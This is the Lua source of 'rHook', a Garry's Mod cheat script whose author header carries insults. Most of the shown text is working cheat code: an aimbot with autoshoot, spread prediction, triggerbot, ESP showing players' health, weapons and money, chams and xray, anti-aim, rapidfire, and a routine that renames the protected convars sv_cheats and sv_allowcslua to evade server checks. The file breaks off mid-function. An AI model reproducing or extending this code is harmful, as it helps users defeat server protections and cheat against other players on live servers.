--[[
--[[
rHook
by Razor

Fucks go to:

Almost everyone not listed in my Thanks list

Thanks go to:

Jake
Edd
Aaron
n,e,r,d,l,o,s,e,r
Sadistic
Gravko
D3X
SiNs0N
Brink
K1TT1X - I know most of you hate him for c&ping, but I don't care if someone is a skid if the person is nice. Fucktards.
Function - Even tho we had some drama lately, hes still a good friend

Tips:

Don't even start with GMod
Just leave it be
It's autistic and not fun anymore



This will probaly be the fastest Lua aimbot out there, if not respect to the one who beats it
Messy coding style, i know, but i dont care.

]]

-- Prep

if rh then
	_G.rawset(_G, "rh", nil)
end

local rh = {}

rh.Hooks = {}
rh.Commands = {}
rh.Cvars = {
	{"rhook_bunnyhop", "1"},
	{"rhook_bunnyhop_autostrafe", "1"},
	{"rhook_chams", "1"},
	{"rhook_antiaim", "0"},
	{"rhook_antiaim_method", "1"},
	{"rhook_spinbot", "0"},
	{"rhook_spinbot_speed", "5"},
	{"rhook_rapidfire", "0"},
	{"rhook_esp", "1"},
	{"rhook_esp_box", "1"},
	{"rhook_thirdperson", "0"},
	{"rhook_nospread", "1"},
	{"rhook_aimbot_autoshoot", "1"},
	{"rhook_aimbot_targetfriends", "0"},
	{"rhook_triggerbot", "0"},
	{"rhook_xray_color_b", "255"},
	{"rhook_xray_color_r", "0"},
	{"rhook_xray_color_g", "0"},
	{"rhook_xray_color_a", "120"},
	{"rhook_xray", "0"},
	{"rhook_xray_noweapon", "0"},
	{"rhook_thirdperson_dist", "100"},
	{"rhook_prediction", "1"},
	{"rhook_esp_show_name", "1"},
	{"rhook_esp_show_weapon", "1"},
	{"rhook_esp_show_hp", "1"},
	{"rhook_esp_show_group", "1"},
	{"rhook_esp_show_rpmoney", "1"},
	{"rhook_esp_show_armor", "1"},
	{"rhook_crouchjump", "0"},
	{"rhook_crouchjump_onkey", "0"},
	{"rhook_skeleton", "0"},
	{"rhook_tracers", "1"},
	{"rhook_calcview", "1"},
	{"rhook_calcview_model_nosway", "1"},
	{"rhook_ignorespawnprotection", "1"},
	{"rhook_autowall", "1"},
}

rh.Antiaims = {
	{"1", "Static Up"},
	{"2", "Static Down"},
	{"3", "Static Up/Down Change"},
	{"4", "Sideway Follow Right Up"},
	{"5", "Sideway Follow Right Down"},
	{"6", "Sideway Follow Right Up/Down Change"},
	{"7", "Sideway Follow Left Up"},
	{"8", "Sideway Follow Left Down"},
	{"9", "Sideway Follow Left Up/Down Change"},
	{"10", "Jitter Up"},
	{"11", "Jitter Down"},
	{"12", "Jitter Up/Down Change"},
	{"13", "Random Angles 1"},
	{"14", "Random Angles 2"},
	{"15", "Jitter Up Random Fake Angles"},
	{"16", "Jitter Down Random Fake Angles"},
}

rh.DoingTTT = false
	
rh.TBot = false

rh.Log = {}

local doing180 = false
local toggle
local doshit = false

rh.g = _G.table.Copy( _G )

rh.g.file.CreateDir("rhook")

function rh.Logger(msg)
	rh.g.file.Append("rhook/log.txt", msg.."\n")
end

function rh.Notify(msg, chat)
	rh.Logger(rh.g.os.date()..": "..msg)
	if !chat then
		rh.g.MsgC(rh.g.Color(40, 180, 20), "[rHook]: ", rh.g.Color(255,0,93), msg.."\n")
		return
	end
	rh.g.chat.AddText(rh.g.Color(40, 180, 20), "[rHook]: ", rh.g.Color(255,0,93), msg)
end

rh.Logger("\n\n\nrHook Startup @ "..rh.g.os.date().."\n\n\n")
	
function rh.AddHook(t, n, f)
	if !t or !n or !f then return end
	local n = rh.g.util.CRC(n)
	rh.g.hook.Add(t, n, f)
	if !rh.Hooks[t] then
		rh.Hooks[t] = {}
	end
	rh.Hooks[t][n] = f
	rh.Notify("Added Hook: Type: "..t.." | Name: "..n.." ("..rh.g.tostring(f)..").")
end

function rh.AddCommand(cmd, fun)
	if !cmd or !fun then return end
	rh.g.concommand.Add(cmd, fun)
	rh.Notify("Added Command: "..cmd.." ("..rh.g.tostring(fun)..").")
end

function rh.CreateCvar(n, v)
	if !n or !v then return end
	rh.g.CreateClientConVar(n,v)
	rh.Notify("Created ConVar '"..n.."' with value/string '"..v.."'.")
end

for k,v in rh.g.pairs(rh.Cvars) do
	rh.CreateCvar(v[1], v[2])
end
	
rh.AddCommand("rhook_printhooks", function() 
	rh.g.PrintTable(rh.Hooks)
end)

rh.AddCommand("rhook_printcvars", function()
	rh.g.PrintTable(rh.Cvars)
end)

function rh.Copy(tab)
	if !tab then return end
	if rh.g.type(tab) != "table" then return tab end
	local copy = {}
	for k,v in rh.g.pairs(tab) do
		copy[k] = v
	end
	if copy.MetaName then
		rh.Notify("Copied Metatable '"..copy.MetaName.."'.")
	end
	return copy
end

function rh.LoadModule(mod)
	rh.g.require(mod)
	rh.Notify("Loaded module '"..mod.."'.")
end

rh.r = rh.Copy(rh.g.debug.getregistry())

rh.CmdM = rh.Copy(rh.g.FindMetaTable("CUserCmd"))
rh.EntM = rh.Copy(rh.g.FindMetaTable("Entity"))
rh.PlyM = rh.Copy(rh.g.FindMetaTable("Player"))
rh.VecM = rh.Copy(rh.g.FindMetaTable("Vector"))
rh.AngM = rh.Copy(rh.g.FindMetaTable("Angle"))


rh.LoadModule("dickwrap")
rh.LoadModule("_nyx")
rh.LoadModule("_cv3")

rh.nyx = rh.Copy(_nyx)
rh.dickwrap = rh.Copy(dickwrap)

rh.Spoof = {
	{ "sv_cheats", "1", "0", "bot_defend", "rhook_sv_cheats" },
	{ "sv_allowcslua", "1", "0", "bot_changeclass", "rhook_sv_allowcslua" },
	{ "host_framerate", "0", "0", "bot_crouch", "rhook_host_framerate" },
}

function rh.RenameVar(cv, nv, ov, oc, nc)
	GetConVar(cv):SetName(nc)
	GetConVar(oc):SetName(cv)
	GetConVar(cv):SetValue(ov)
	GetConVar(nc):SetValue(nv)
	GetConVar(nc):SetFlags(0)
end

for k,v in rh.g.pairs(rh.Spoof) do
	if !rh.g.ConVarExists(v[4]) then continue end
	rh.RenameVar(v[1], v[2], v[3], v[4], v[5])
end

rh.Me = rh.g.LocalPlayer()

--[[
Easy things first
]]

function rh.Bunnyhop(ucmd)
	if rh.g.GetConVarNumber("rhook_bunnyhop") != 1 then return end
	rh.nyx.Bunnyhop(ucmd, rh.EntM.IsOnGround(rh.Me))
	if rh.g.GetConVarNumber("rhook_bunnyhop_autostrafe") != 1 or rh.EntM.IsOnGround(rh.Me) or !rh.g.input.IsKeyDown(65) then return end
	if rh.CmdM.GetMouseX(ucmd) < 0 then
		rh.CmdM.SetSideMove(ucmd, -10000)
	elseif rh.CmdM.GetMouseX(ucmd) > 0 then
		rh.CmdM.SetSideMove(ucmd, 10000)
	end
end

rh.AddHook("CreateMove", "Bunnyhop", rh.Bunnyhop)

local oa = rh.EntM.EyeAngles(rh.Me)

function rh.CalcView(ply, origin, angles, fov)
	if rh.g.GetConVarNumber("rhook_calcview") != 1 then return end
	local view = {}
	view.angles = toggle and rh.g.Angle(oa.x, oa.y - 180, 0) or oa
	view.origin = rh.g.GetConVarNumber("rhook_thirdperson") == 1 and origin - rh.AngM.Forward(oa) * rh.g.GetConVarNumber("rhook_thirdperson_dist") or origin
	view.fov = fov
	view.vm_angles = oa
	view.vm_origin = origin
	return view
end

rh.AddHook("ShouldDrawLocalPlayer", "DrawLP", function()
	return rh.g.GetConVarNumber("rhook_thirdperson") == 1 
end)

rh.AddHook("CalcView", "CalcView", rh.CalcView)

function rh.CalcViewModelView(_, _, opos, _, pos, a)
	local pt, at
	if rh.g.GetConVarNumber("rhook_spinbot") == 1 or rh.g.GetConVarNumber("rhook_antiaim") == 1 or rh.Enabled then
		pt = opos
		at = oa
	else
		pt = pos
		at = a
	end
	return pt, at
end

rh.AddHook("CalcViewModelView", "CalcViewModelView", rh.CalcViewModelView)

rh.Cones = {}

function rh.GetWeapon()
	local w = rh.PlyM.GetActiveWeapon(rh.Me)
	if !rh.EntM.IsValid(w) then return nil end
	local class = rh.EntM.GetClass(w)
	return class
end

rh.oEFB = rh.r.Entity.FireBullets

rh.r.Entity.FireBullets = function(p, data)
	local spread = data.Spread
	if !spread then 
		return rh.oEFB(p, data)
	end
	local wep = rh.GetWeapon()
	if !wep then 
		return rh.oEFB(p, data)
	end
	if rh.Cones[wep] == spread * -1 then 
		return rh.oEFB(p, data)
	end
	rh.Cones[wep] = spread * -1
	rh.Notify("Found Cone for "..wep.." | "..rh.g.tostring(spread))
	return rh.oEFB(p, data)
end

function rh.PredictSpread(ucmd, ang, shit)
	if rh.g.GetConVarNumber("rhook_nospread") != 1 then return ang end
	if shit then
		if !rh.g.input.IsMouseDown(107) then
			return ang
		end
	end
	local wep = rh.GetWeapon()
	if !wep then return ang end
	if !rh.Cones[wep] then return ang end
	return rh.VecM.Angle( rh.dickwrap.Predict(ucmd, rh.AngM.Forward(ang), rh.Cones[wep]) )
end

rh.Target = nil
rh.Enabled = false

rh.Penetrations = {
	["pistol"] = 2,
	["357"] = 5,
	["smg1"] = 5,
	["pistol"] = 4,
	["ar2"] = 4,
	["buckshot"] = 4,
	["slam"] = 0,
	["AirboatGun"] = 8,
	["SniperPenetratedRound"] = 20,
}

function rh.CanPenetrate(w, tr) -- Old Madcows autowall fixed up for m9k
	if !w.Primary then return false end
	local base = w.Base
	if !base or !rh.g.string.find(base, "bobs_") then return false end
	local max = rh.Penetrations[w.Primary.Ammo]
	if !max then return false end
	local dir = tr.Normal * max
	local rico
	if tr.MatType == 87 then
		dir = tr.Normal * (max * 2)
	end
	if tr.MatType == 77 and w.Ricochet and w.Primary.Ammo != "SniperPenetratedRound" then
		return false
	end
	local trace = {
		endpos = tr.HitPos,
		start = tr.HitPos + dir,
		mask = 1174421507,
		filter = {rh.Me},
	}
	local t = rh.g.util.TraceLine( trace )
	if( t.StartSolid || t.Fraction >= 1.0 || tr.Fraction <= 0.0) then return false end
	return true
end

function rh.Valid(v)
	if !v then return false end
	if !rh.EntM.IsValid(v) then return false end
	if v == rh.Me then return false end
	if rh.PlyM.Team(v) == 1002 then return false end
	if rh.EntM.GetMoveType(v) == 10 then return false end
	if rh.g.GetConVarNumber("rhook_ignorespawnprotection") == 0 then if rh.EntM.GetColor(v).a < 150 then return false end end
	if rh.EntM.Health(v) < 1 then return false end
	if rh.g.GetConVarNumber("rhook_aimbot_targetfriends") == 0 and rh.PlyM.GetFriendStatus(v) == "friend" then return false end
	if rh.EntM.IsDormant(v) then return false end
	local pos = rh.EntM.GetAttachment(v, rh.EntM.LookupAttachment(v, "eyes"))
	local pos = pos and pos.Pos or rh.EntM.LocalToWorld(v, rh.EntM.OBBCenter(v))
	local tr = {}
	tr.endpos = pos
	tr.start = rh.EntM.EyePos(rh.Me)
	tr.mask = 1174421507
	tr.filter = {rh.Me, v}
	local trace = rh.g.util.TraceLine(tr)
	if trace.Fraction != 1 and rh.g.GetConVarNumber("rhook_autowall") == 1 then
		local tr2 = {}
		tr2.endpos = pos
		tr2.start = rh.EntM.EyePos(rh.Me)
		tr2.mask = 1174421507
		return rh.CanPenetrate(rh.PlyM.GetActiveWeapon(rh.Me), rh.g.util.TraceLine(tr2))
	end
	return trace.Fraction == 1
end

function rh.GetTarget()
	local allplys = rh.g.player.GetAll()
	for i = 1, #allplys do
		local v = allplys[i]
		if !rh.Valid(v) then continue end
		rh.Target = v 
		return 
	end
end

function rh.GetPos()
	local v = rh.Target
	local pos1 = rh.EntM.GetAttachment(v, rh.EntM.LookupAttachment(v, "eyes"))
	local pos1 = pos1 and pos1.Pos or rh.EntM.LocalToWorld(v, rh.EntM.OBBCenter(v))
	local pos2 = rh.EntM.EyePos(rh.Me)
	local prediction = rh.g.GetConVarNumber("rhook_prediction") == 1 and (rh.EntM.GetVelocity(v) * .0067) or rh.g.Vector()
	local pos = pos1 - pos2 + prediction
	return rh.VecM.Angle(pos)
end

function rh.FixMovement(ucmd,aa) -- Taken from Styleshack, thanks for that
	local side = rh.g.Vector(rh.CmdM.GetForwardMove(ucmd), rh.CmdM.GetSideMove(ucmd), 0)
	local side = rh.AngM.Forward((rh.VecM.Angle(rh.VecM.GetNormal(side)) + (rh.CmdM.GetViewAngles(ucmd) - rh.g.Angle(0, oa.y, 0)))) * rh.VecM.Length(side)
	if aa then
		rh.CmdM.SetForwardMove(ucmd, side.x)
		rh.CmdM.SetSideMove(ucmd, side.y * -1)
		return
	end
	rh.CmdM.SetForwardMove(ucmd, side.x)
	rh.CmdM.SetSideMove(ucmd, side.y)
end

rh.VTE = false
rh.AA = false



function rh.Aimbot(ucmd)
	oa = oa + rh.g.Angle(rh.CmdM.GetMouseY(ucmd) * .023, rh.CmdM.GetMouseX(ucmd) * -0.023, 0)
	oa.y = rh.g.math.NormalizeAngle(oa.y)
	oa.p = rh.g.math.Clamp(oa.p, -89, 89)
	if rh.Enabled and rh.Valid(rh.Target) then
		rh.VTE = true
		local pos = rh.GetPos()
		local pos = rh.PredictSpread(ucmd, pos)
		pos.y = rh.g.math.NormalizeAngle(pos.y)
		rh.CmdM.SetViewAngles(ucmd, pos)
		if rh.g.GetConVarNumber("rhook_aimbot_autoshoot") == 1 then
		rh.CmdM.SetButtons(ucmd, rh.g.bit.bor(rh.CmdM.GetButtons(ucmd), 1))
		end
		rh.FixMovement(ucmd)
		return
	end
	rh.VTE = false
	if !rh.Valid(rh.Target) then
		rh.GetTarget()
	end
	if checkingang then
		rh.FixMovement(ucmd)
		return
	end
	local keydown = rh.g.input.IsMouseDown(107) or rh.g.input.IsKeyDown(15)
	local aa = rh.g.GetConVarNumber("rhook_spinbot") == 1 or rh.g.GetConVarNumber("rhook_antiaim") == 1 or false
	if aa and !keydown or doing180 or rh.TBot or doshit then return end
	local ang = rh.PredictSpread(ucmd, oa, true)
	rh.CmdM.SetViewAngles(ucmd, ang)
end

rh.AddHook("CreateMove", "Aimbot", rh.Aimbot)

rh.AddCommand("+rhook_aimbot", function() rh.Enabled = true end)
rh.AddCommand("-rhook_aimbot", function() rh.Enabled = false end)

local change

function rh.Antiaim(ucmd)
	if rh.g.GetConVarNumber("rhook_antiaim") != 1 or rh.VTE or rh.g.input.IsMouseDown(107) or rh.g.input.IsKeyDown(15) then return end
	rh.AA = true
	local method = rh.g.GetConVarNumber("rhook_antiaim_method")
	if method == 1 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(181, oa.y, 0))
		rh.CmdM.SetForwardMove(ucmd, rh.CmdM.GetForwardMove(ucmd) * -1)
	elseif method == 2 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(-181, oa.y, 0))
		rh.CmdM.SetForwardMove(ucmd, rh.CmdM.GetForwardMove(ucmd) * -1)
	elseif method == 3 then
		local ang = change and -181 or 181
		change = not change
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(ang, oa.y, 0))
		rh.CmdM.SetForwardMove(ucmd, rh.CmdM.GetForwardMove(ucmd) * -1)
	elseif method == 4 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(181, oa.y - 90, 0))
		rh.FixMovement(ucmd, true)
	elseif method == 5 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(-181, oa.y - 90, 0))
		rh.FixMovement(ucmd, true)
	elseif method == 6 then
		local ang = change and -181 or 181
		change = not change
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(ang, oa.y - 90, 0))
		rh.FixMovement(ucmd, true)
	elseif method == 7 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(181, oa.y + 90, 0))
		rh.FixMovement(ucmd, true)
	elseif method == 8 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(-181, oa.y + 90, 0))
		rh.FixMovement(ucmd, true)
	elseif method == 9 then
		local ang = change and -181 or 181
		change = not change
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(ang, oa.y + 90, 0))
		rh.FixMovement(ucmd, true)
	elseif method == 10 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(181, rh.g.math.random(-180,180), 0))
		rh.FixMovement(ucmd, true)
	elseif method == 11 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(-181, rh.g.math.random(-180,180), 0))
		rh.FixMovement(ucmd, true)
	elseif method == 12 then
		local ang = change and 181 or -181
		change = not change
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(ang, rh.g.math.random(-180,180), 0))
		rh.FixMovement(ucmd, true)
	elseif method == 13 then
		local rand1 = rh.g.math.random(1,2)
		local rand2 = rh.g.math.random(1,2)
		local ang = rand1 == 1 and 90 or 0
		local ang2 = rand2 == 1 and 181 or -181
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(ang2, ang, 0))
		rh.FixMovement(ucmd, true)
	elseif method == 14 then
		local rand1 = rh.g.math.random(1,5)
		local rand2 = rh.g.math.random(1,2)
		local ang = rand1 == 1 and 90 or rand2 == 2 and 180 or rand3 == 3 and 270 or rand1 == 4 and 45 or 360
		local ang2 = rand2 == 1 and 181 or -181
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(ang2, ang, 0))
		rh.FixMovement(ucmd, true)
	elseif method == 15 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(rh.g.math.random(181, 270), rh.g.math.random(-180,180), 0))
		rh.FixMovement(ucmd, true)
	elseif method == 16 then
		rh.CmdM.SetViewAngles(ucmd, rh.g.Angle(rh.g.math.random(-270, -181), rh.g.math.random(-180,180), 0))
		rh.FixMovement(ucmd, true)
	end
end

rh.AddHook("CreateMove", "Antiaim", rh.Antiaim)

function rh.Spinbot(ucmd)
	if rh.g.GetConVarNumber("rhook_spinbot") != 1 or rh.VTE or rh.g.input.IsMouseDown(107) or rh.g.input.IsKeyDown(15) then 
		return 
	end
	local amount = rh.g.GetConVarNumber("rhook_spinbot_speed")
	rh.CmdM.SetViewAngles(ucmd, rh.CmdM.GetViewAngles(ucmd) + rh.g.Angle(0, amount, 0))
	rh.FixMovement(ucmd)
end

rh.AddHook("CreateMove", "Spinbot", rh.Spinbot)

function rh.ESP(v)
	if rh.g.GetConVarNumber("rhook_esp") != 1 then return end
	if rh.g.GetConVarNumber("rhook_esp_box") == 1 then
	local min,max = rh.EntM.WorldSpaceAABB(v)
	local diff = max-min
	local pos2 = rh.g.Vector(0,0,0)
	local pos1 = rh.g.Vector(0,0,0)
	local pos3 = rh.g.Vector(0,0,0)
	local pos4 = rh.g.Vector(0,0,0)
	local pos5 = rh.g.Vector(0,0,diff.z)
	local pos6 = rh.g.Vector(0,0,diff.z)
	local pos7 = rh.g.Vector(0,0,diff.z)
	local pos8 = rh.g.Vector(0,0,diff.z)
	local pos1 = rh.VecM.ToScreen(pos1 + rh.EntM.WorldSpaceAABB(v) + rh.g.Vector(diff.x,diff.y,0))
	local pos2 = rh.VecM.ToScreen(pos2 + rh.EntM.WorldSpaceAABB(v) + rh.g.Vector(diff.x,-diff.y/14,0))
	local pos3 = rh.VecM.ToScreen(pos3 + rh.EntM.WorldSpaceAABB(v) + rh.g.Vector(-diff.x/14,-diff.y/14,0))
	local pos4 = rh.VecM.ToScreen(pos4 + rh.EntM.WorldSpaceAABB(v) + rh.g.Vector(-diff.x/14,diff.y,0))
	local pos5 = rh.VecM.ToScreen(pos5 + rh.EntM.WorldSpaceAABB(v) + rh.g.Vector(diff.x,diff.y,0))
	local pos6 = rh.VecM.ToScreen(pos6 + rh.EntM.WorldSpaceAABB(v) + rh.g.Vector(diff.x,-diff.y/14,0))
	local pos7 = rh.VecM.ToScreen(pos7 + rh.EntM.WorldSpaceAABB(v) + rh.g.Vector(-diff.x/14,-diff.y/14,0))
	local pos8 = rh.VecM.ToScreen(pos8 + rh.EntM.WorldSpaceAABB(v) + rh.g.Vector(-diff.x/14,diff.y,0))
	rh.g.surface.SetDrawColor(rh.g.team.GetColor(rh.PlyM.Team(v)))
	rh.g.surface.DrawLine(pos1.x, pos1.y, pos2.x, pos2.y)
	rh.g.surface.DrawLine(pos2.x, pos2.y, pos3.x, pos3.y)
	rh.g.surface.DrawLine(pos3.x, pos3.y, pos4.x, pos4.y)
	rh.g.surface.DrawLine(pos1.x, pos1.y, pos4.x, pos4.y)
	rh.g.surface.DrawLine(pos1.x, pos1.y, pos5.x, pos5.y)
	rh.g.surface.DrawLine(pos2.x, pos2.y, pos6.x, pos6.y)
	rh.g.surface.DrawLine(pos3.x, pos3.y, pos7.x, pos7.y)
	rh.g.surface.DrawLine(pos4.x, pos4.y, pos8.x, pos8.y)
	rh.g.surface.DrawLine(pos5.x, pos5.y, pos6.x, pos6.y)
	rh.g.surface.DrawLine(pos6.x, pos6.y, pos7.x, pos7.y)
	rh.g.surface.DrawLine(pos7.x, pos7.y, pos8.x, pos8.y)
	rh.g.surface.DrawLine(pos5.x, pos5.y, pos8.x, pos8.y)
	end
	local textpos = rh.EntM.LocalToWorld(v, rh.EntM.OBBCenter(v))
	local textpos = rh.VecM.ToScreen(textpos - rh.g.Vector(0,0,35))
	local w = rh.PlyM.GetActiveWeapon(v)
	local w = rh.EntM.IsValid(w) and "Weapon:"..rh.EntM.GetClass(w) or "Unknown Weapon"
	local h = 0
	local col = rh.g.team.GetColor(rh.PlyM.Team(v))
	local col = rh.g.Color(col.g, col.b, col.r)
	if rh.g.GetConVarNumber("rhook_esp_show_name") == 1 then
		rh.g.draw.DrawText(rh.PlyM.Name(v), "BudgetLabel", textpos.x, textpos.y + h, col, 1)
		h = h + 10
	end
	if rh.g.GetConVarNumber("rhook_esp_show_hp") == 1 then
		rh.g.draw.DrawText("HP:"..rh.EntM.Health(v), "BudgetLabel", textpos.x, textpos.y + h, col, 1)
		h = h + 10
	end
	if rh.g.GetConVarNumber("rhook_esp_show_armor") == 1 then
		rh.g.draw.DrawText("AP:"..rh.PlyM.Armor(v), "BudgetLabel", textpos.x, textpos.y + h, col, 1)
		h = h + 10
	end
	if rh.g.GetConVarNumber("rhook_esp_show_weapon") == 1 then
		rh.g.draw.DrawText(w, "BudgetLabel", textpos.x, textpos.y + h, col, 1)
		h = h + 10
	end
	if rh.g.GetConVarNumber("rhook_esp_show_group") == 1 then
		rh.g.draw.DrawText("Group:"..rh.PlyM.GetUserGroup(v), "BudgetLabel", textpos.x, textpos.y + h, col, 1)
		h = h + 10
	end
	if rh.g.GetConVarNumber("rhook_esp_show_rpmoney") == 1 then
		local money = rh.PlyM.getDarkRPVar and rh.PlyM.getDarkRPVar(v, "money") or nil
		if money then
			rh.g.draw.DrawText("Money:"..money, "BudgetLabel", textpos.x, textpos.y + h, col, 1)
			h = h + 10
		end
	end
end

function rh.ESPLoop()
	local allplys = rh.g.player.GetAll()
	for i = 1, #allplys do
		local v = allplys[i]
		if !rh.EntM.IsValid(v) or rh.EntM.Health(v) < 1 or v == rh.Me then continue end
		rh.ESP(v)
	end
end

rh.AddHook("HUDPaint", "ESP", rh.ESPLoop)

function rh.Rapidfire(ucmd)
	if rh.g.GetConVarNumber("rhook_rapidfire") != 1 then return end
	if rh.PlyM.KeyDown(rh.Me, 1) then
		rh.CmdM.SetButtons(ucmd, rh.g.bit.band(rh.CmdM.GetButtons(ucmd), -2))
	end
end

rh.AddHook("CreateMove", "Rapidfire", rh.Rapidfire)

local crouch

function rh.JumpCrouch(ucmd)
	if rh.g.GetConVarNumber("rhook_crouchjump") != 1 or rh.EntM.IsOnGround(rh.Me) or !rh.g.input.IsKeyDown(65) then return end
	if rh.g.GetConVarNumber("rhook_crouchjump_onkey") == 1 then
	if rh.PlyM.KeyDown(rh.Me, 4) then
		rh.CmdM.SetButtons(ucmd, rh.g.bit.band(rh.CmdM.GetButtons(ucmd), -5))
	end
	return
	end
	if crouch then
		rh.CmdM.SetButtons(ucmd, rh.g.bit.bor(rh.CmdM.GetButtons(ucmd), 4))
	end
	crouch = not crouch
end

rh.AddHook("CreateMove", "CrouchJump", rh.JumpCrouch)

rh.AddCommand("rhook_180", function()
	doing180 = true
	rh.PlyM.SetEyeAngles(rh.Me, rh.EntM.EyeAngles(rh.Me) - rh.g.Angle(0, 180, 0))
	oa = rh.EntM.EyeAngles(rh.Me)
	rh.g.timer.Simple(.02, function()
		doing180 = false
	end)
end)

local shoot 

function rh.Triggerbot(ucmd)
	if rh.g.GetConVarNumber("rhook_triggerbot") != 1 then return end
	local trace = rh.PlyM.GetEyeTrace(rh.Me).Entity
	if !rh.EntM.IsValid(trace) or rh.EntM.GetClass(trace) != "player" or rh.EntM.Health(trace) < 1 then 
		rh.TBot = false
		return 
	end
	rh.TBot = true
	if shoot then 
		rh.CmdM.SetViewAngles(ucmd, rh.PredictSpread(ucmd, oa))
		rh.CmdM.SetButtons(ucmd, rh.g.bit.bor(rh.CmdM.GetButtons(ucmd), 1))
	end
	shoot = not shoot
end

rh.AddHook("CreateMove", "Triggerbot", rh.Triggerbot)

function rh.GetPlayer()
	local allplayer = rh.g.player.GetAll()
	local ptr = {}
	for i = 1, #allplayer do
		local v = allplayer[i]
		if !rh.EntM.IsValid(v) or v == rh.Me or rh.EntM.Health(v) < 1 or rh.PlyM.Team(v) == 1002 then continue end
		rh.g.table.insert(ptr, v)
	end
	return ptr
end

rh.ChamsMat = CreateMaterial("AsPSF03FJ9g3", "VertexLitGeneric", 
	{
		["$basetexture"] = "models/debug/debugwhite", 
		["$model"] = 1, 
		["$ignorez"] = 1 
	}
)

rh.ChamsMat2 = CreateMaterial("AsPSF03F545J9g3", "VertexLitGeneric", 
	{
		["$basetexture"] = "models/debug/debugwhite", 
		["$model"] = 1, 
		["$ignorez"] = 0
	}
)

function rh.Chams()
	if rh.g.GetConVarNumber("rhook_xray") == 1 or rh.g.GetConVarNumber("rhook_chams") != 1 then return end
	local allplys = rh.GetPlayer()
	for i = 1, #allplys do
		local v = allplys[i]
		if !v then continue end
		rh.g.cam.Start3D()
			local col = rh.g.team.GetColor(rh.PlyM.Team(v)) 
			rh.g.render.SuppressEngineLighting(true)
			rh.g.render.SetColorModulation(col.r / 255, col.g / 255, col.b / 255)
			rh.g.render.MaterialOverride(rh.ChamsMat)
			rh.EntM.DrawModel(v)
			rh.g.render.SetColorModulation(col.g / 255, col.b / 255, col.r / 255)
			rh.g.render.MaterialOverride(rh.ChamsMat2)
			rh.EntM.DrawModel(v)
			rh.g.render.SuppressEngineLighting(false)
		rh.g.cam.End3D()
	end
end

rh.AddHook("RenderScreenspaceEffects", "Chams", rh.Chams)

local soundplayed = 0

rh.XRayEnts = {
	["prop_physics"] = true,
	["gmod_button"] = true,
	["func_wall"] = true,
	["func_breakable"] = true,
	["func_door"] = true,
	["prop_door_rotating"] = true,
	["func_breakable_surf"] = true,
	["spawned_shipment"] = true,
	["spawned_weapon"] = true,
	["spawned_money"] = true,
}

rh.AddCommand("rhook_xray_entlist", function()
	local oval = rh.g.GetConVarNumber("rhook_xray")
	rh.g.RunConsoleCommand("rhook_xray", 0)
	local vgui = rh.g.vgui
	local panel = vgui.Create("DFrame")
	panel:SetSize(500, 400)
	panel:SetTitle("rHook | XRay Ents")
	panel:Center()
	panel:MakePopup()
	
	local on = vgui.Create("DListView", panel)
	on:SetSize(200, 360)
	on:SetPos(10, 30)
	on:AddColumn("Being shown by XRay")
	
	local noton = vgui.Create("DListView", panel)
	noton:SetSize(200, 360)
	noton:SetPos(290, 30)
	noton:AddColumn("Not being shown by XRay")
	
	local add = vgui.Create("DButton", panel)
	add:SetText("<----")
	add:SetSize(35, 20)
	add:SetPos(235, 160)
	add.DoClick = function()
		if !noton:GetSelectedLine() then return end
		local class = noton:GetLine(noton:GetSelectedLine()):GetValue(1)
		noton:RemoveLine(noton:GetSelectedLine())
		on:AddLine(class)
		rh.XRayEnts[class] = true
	end
	
	local rem = vgui.Create("DButton", panel)
	rem:SetText("---->")
	rem:SetSize(35, 20)
	rem:SetPos(235, 200)
	rem.DoClick = function()
		if !on:GetSelectedLine() then return end
		local class = on:GetLine(on:GetSelectedLine()):GetValue(1)
		on:RemoveLine(on:GetSelectedLine())
		noton:AddLine(class)
		rh.XRayEnts[class] = false
	end
	
	local classes = {}
	
	local allents = rh.g.ents.GetAll()
	for i = 1, #allents do
		local v = allents[i]
		if !rh.EntM.IsValid(v) or rh.g.table.HasValue(classes, rh.EntM.GetClass(v)) or rh.EntM.GetClass(v) == "player" then continue end
		rh.g.table.insert(classes, rh.EntM.GetClass(v))
	end
	
	for k,v in rh.g.pairs(classes) do
		if rh.XRayEnts[v] then
			continue
		end
		noton:AddLine(v)
	end
	
	for k,v in rh.g.pairs(rh.XRayEnts) do
		if rh.XRayEnts[k] then
			on:AddLine(k)
		end
	end
	local name = rh.g.util.CRC(rh.g.util.CRC(rh.g.os.date())..rh.g.math.random(1, 1000))
	rh.g.hook.Add("Think", name, function()
		if !IsValid(panel) then
			rh.g.RunConsoleCommand("rhook_xray", oval)
			rh.g.hook.Remove("Think", name)
		end
	end)
	
end)

rh.AddCommand("rhook_printtrace", function()
	local trace = rh.PlyM.GetEyeTrace(rh.Me).Entity
	if !rh.EntM.IsValid(trace) then return end
	rh.g.print(rh.EntM.GetClass(trace))
end)
	
function rh.GetProps()
	local ptr = {}
	local allents = rh.g.ents.GetAll()
	for i = 1, #allents do
		local v = allents[i]
		if !rh.EntM.IsValid(v) or !rh.XRayEnts[rh.EntM.GetClass(v)] then continue end
		rh.g.table.insert(ptr, v)
	end
	return ptr
end

function rh.XRay()
	if soundplayed == 0 and rh.g.GetConVarNumber("rhook_xray") == 1 then
		soundplayed = 1
		rh.g.surface.PlaySound("buttons/button3.wav")
	end
	if soundplayed == 1 and rh.g.GetConVarNumber("rhook_xray") != 1 then
		soundplayed = 0
		rh.g.surface.PlaySound("buttons/button18.wav")
	end
	if rh.g.GetConVarNumber("rhook_xray") != 1 then 
		local allprops = rh.g.ents.GetAll()
		for i = 1, #allprops do
			local v = allprops[i]
			if !rh.EntM.IsValid(v) then continue end
			rh.EntM.SetNoDraw(v, false)
		end
		local ent = rh.PlyM.GetViewModel(rh.Me)
